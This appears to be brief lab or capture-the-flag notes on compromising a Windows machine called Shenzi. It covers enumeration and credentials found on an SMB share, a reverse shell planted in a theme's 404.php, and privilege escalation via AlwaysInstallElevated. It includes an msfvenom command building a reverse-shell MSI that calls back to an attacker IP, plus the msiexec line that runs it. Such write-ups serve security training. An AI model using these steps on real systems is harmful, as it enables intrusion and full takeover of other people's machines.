nmap shows 21 ftp, 80 web, 139-445 smb, 443 web, 3306 mysql, 5040
ftp locked down.

anonymous login allowed on smb, with read access on "Shenzi" share
rid-brute shows "Shenzi" user

we find a few default xampp files, with WEBDAV creds xampp-dav-unsecure:ppmax2011 which is possibly default as well

phpinfo shows document_root is C:/xampp/htdocs
Also found
   User: admin
   Password: FeltHeadwallWight357

With little guesswork, we guess the page has to be at /shenzi, which it was
So we login using the above creds, and we in

There, we go to theme editor, and edit the 404.php to windows reverse shell. then visit an invalid page, and we're shenzi!

---
we find `netstat -na | findstr LISTENING` shows a port 14147, default administrative port for filezilla

Running winpeas, we find AlwaysInstallElevated is enabled
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.200 LPORT=21 -f msi -o malicious.msi` on kali to generate the malicious msi file, transfer it to target windows
start listening on port 21
`msiexec /quiet /qn /i C:\programdata\malicious.msi` on windows to get admin!